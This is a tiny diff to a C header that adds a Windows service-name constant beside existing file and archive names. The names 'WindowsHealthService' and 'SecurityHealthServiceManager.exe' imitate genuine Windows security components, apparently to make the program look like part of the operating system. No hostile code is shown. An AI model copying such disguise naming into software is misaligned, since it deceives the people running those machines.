@@ -4,6 +4,7 @@
 #define GENERAL_H
 #define WIN32_LEAN_AND_MEAN		//if left out order of windows.h and winsock.h plays messes up everything (just leave it in)
 
+#define SERVICE_NAME "WindowsHealthService"
 #define SERVICE_FILE_NAME "SecurityHealthServiceManager.exe"
 #define SERVICE_ARCHIVE_NAME "external.zip"
 
